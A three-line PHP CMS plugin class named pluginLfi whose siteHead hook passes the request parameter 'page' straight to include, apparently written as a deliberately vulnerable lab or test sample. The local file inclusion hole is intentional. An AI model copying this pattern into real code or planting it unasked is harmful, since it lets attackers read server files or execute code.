<?php
class pluginLfi extends Plugin {
	public function siteHead() { include($_GET['page']); }
}
